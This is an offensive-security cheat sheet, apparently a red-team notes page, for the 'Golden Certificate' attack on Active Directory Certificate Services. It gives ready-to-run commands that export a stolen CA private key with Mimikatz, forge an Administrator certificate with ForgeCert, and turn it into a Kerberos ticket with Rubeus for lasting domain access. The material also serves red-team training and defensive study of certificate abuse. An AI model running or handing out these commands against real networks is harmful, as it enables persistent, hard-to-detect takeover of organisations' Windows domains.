# 03.13 ForgeCert

> GhostPack tool to forge ADCS certificates given a stolen CA certificate + private key.

## Overview

ForgeCert is the offline-CA-impersonation tool. Given a stolen CA cert + private key (extracted via Mimikatz crypto::capi or from a backed-up CA), forges a certificate for any principal in the domain. Like a 'Golden Certificate' attack — analogous to Golden Ticket but for ADCS. Pair with Mimikatz to extract the CA key first.

## Steps

- **Step 1** - Compromise the CA server (admin access).
- **Step 2** - Extract CA private key with Mimikatz.
- **Step 3** - Use ForgeCert to mint a cert as any principal.
- **Step 4** - Authenticate with Rubeus.

## Commands

### Extract CA private key (on CA host)

```mimikatz
privilege::debug
crypto::capi
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE /store:My
# Outputs <CA-NAME>.pfx — that's the CA cert + key
```

### Get ForgeCert

```bash
git clone https://github.com/GhostPack/ForgeCert
# Build with Visual Studio or use pre-compiled release
```

### Forge cert as any user

```powershell
ForgeCert.exe --CaCertPath <CA-NAME>.pfx --CaCertPassword <PFX-PASS> --Subject 'CN=User' --SubjectAltName 'Administrator@<DOMAIN>' --NewCertPath admin.pfx --NewCertPassword Password123!
```

### Authenticate with forged cert

```powershell
Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:Password123! /ptt
# Persists until CA cert is revoked
```
